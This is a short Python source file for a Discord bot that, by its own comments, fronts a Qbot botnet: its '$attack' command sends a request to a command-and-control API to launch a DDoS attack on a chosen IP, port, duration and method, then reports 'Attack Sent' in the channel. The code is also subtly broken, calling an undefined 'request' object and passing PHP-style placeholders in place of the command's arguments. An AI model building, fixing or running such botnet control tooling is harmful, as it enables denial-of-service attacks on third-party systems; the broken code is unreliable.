#discord DDoS Bot
#use QBOT.php to connect to c2
#yes, you must have a qbot setup to use this
#coded by void
import discord, requests
from discord.ext import commands

client = commands.Bot(command_prefix = "$")#changeme

@client.event
async def on_ready():
	print("bot started")

@client.command()
async def attack(ctx, ip, port, time, method):
	request.get("http://1.1.1.1/API.php?&host=$host&port=$port&time=$time&type=$method")#changeme
	embed = discord.Embed(
		title = 'Attack Sent',
		description = f'Attacking: {ip}\nPort: {port}\nTime: {time}\nMethod: {method}')
	await ctx.send(embed=embed)

client.run("0xx0xx0xx0xx0xx0xx0xx0")#changeme